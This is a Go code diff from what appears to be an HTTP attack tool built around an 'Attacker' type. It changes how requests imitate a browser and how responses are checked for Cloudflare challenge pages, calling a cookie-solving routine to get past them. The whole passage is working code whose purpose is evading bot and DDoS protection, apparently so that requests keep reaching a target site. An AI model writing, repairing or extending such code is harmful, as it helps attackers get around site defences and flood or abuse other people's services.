@@ -2,9 +2,9 @@ package main
 
 import (
 	"crypto/tls"
+	"fmt"
 	"golang.org/x/net/html"
 	"io"
-	"math/rand"
 	"net/http"
 	"time"
 )
@@ -25,16 +25,7 @@ func (a *Attacker) BuildCheckerRequest() (*http.Request, error) {
 	request.Header.Add("Sec-Fetch-Mode", "navigate")
 	request.Header.Add("Sec-Fetch-User", "?1")
 	request.Header.Add("Sec-Fetch-Dest", "document")
-	if a.attack.AcceptEncoding == "" {
-		request.Header.Add("Accept-Encoding", acceptEncodings[rand.Intn(len(acceptEncodings))])
-	} else {
-		request.Header.Add("Accept-Encoding", a.attack.AcceptEncoding)
-	}
-	if a.attack.AcceptLanguage == "" {
-		request.Header.Add("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])
-	} else {
-		request.Header.Add("Accept-Language", a.attack.AcceptLanguage)
-	}
+	request.Header.Add("Accept-Language", "en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7,de;q=0.6,ar;q=0.5,pt;q=0.4,ja;q=0.3,fr;q=0.2")
 	if len(a.cookies) > 0 {
 		for _, cookie := range a.cookies {
 			request.AddCookie(&http.Cookie{Name: cookie.Name, Value: cookie.Value})
@@ -68,24 +59,22 @@ func (a *Attacker) CheckResponse(expired chan bool) {
 			time.Sleep(time.Second)
 			continue
 		}
+
+		title, err := GetHtmlTitle(r.Body)
+		if err != nil {
+			time.Sleep(time.Second)
+			r.Body.Close()
+			continue
+		}
+		fmt.Println(title)
 		if r.StatusCode == 403 {
 			a.SolveCookie()
 		} else if r.StatusCode == 503 {
-			title, err := GetHtmlTitle(r.Body)
-			if err != nil {
-				time.Sleep(time.Second)
-				continue
-			}
 			if title == "Just a moment..." {
 				a.SolveCookie()
 			}
 		} else if r.StatusCode == 200 {
-			title, err := GetHtmlTitle(r.Body)
-			if err != nil {
-				time.Sleep(time.Second)
-				continue
-			}
-			if title == "Attention Required! | Cloudflare" {
+			if title == "Attention Required! | Cloudflare" || title == "Please Wait... | Cloudflare" {
 				a.SolveCookie()
 			}
 		}
@@ -102,14 +91,12 @@ func Traverse(n *html.Node) (string, bool) {
 	if IsTitleElement(n) {
 		return n.FirstChild.Data, true
 	}
-
 	for c := n.FirstChild; c != nil; c = c.NextSibling {
 		result, ok := Traverse(c)
 		if ok {
 			return result, ok
 		}
 	}
-
 	return "", false
 }
 
@@ -118,6 +105,7 @@ func GetHtmlTitle(r io.Reader) (string, error) {
 	if err != nil {
 		return "", err
 	}
+
 	title, _ := Traverse(doc)
 	return title, nil
 }
